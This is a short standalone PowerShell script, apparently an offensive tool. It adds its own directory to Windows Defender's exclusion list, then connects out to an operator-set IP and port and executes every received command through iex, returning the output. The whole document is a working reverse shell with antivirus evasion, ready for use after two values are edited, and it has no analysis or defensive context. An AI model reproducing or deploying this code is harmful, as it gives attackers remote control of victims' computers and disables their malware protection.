
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
Add-MpPreference -ExclusionPath $scriptDir

$server = "192.168.1.100"  # CHANGE THIS IP
$port = 4444  # CHANGE THIS PORT

$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close() 
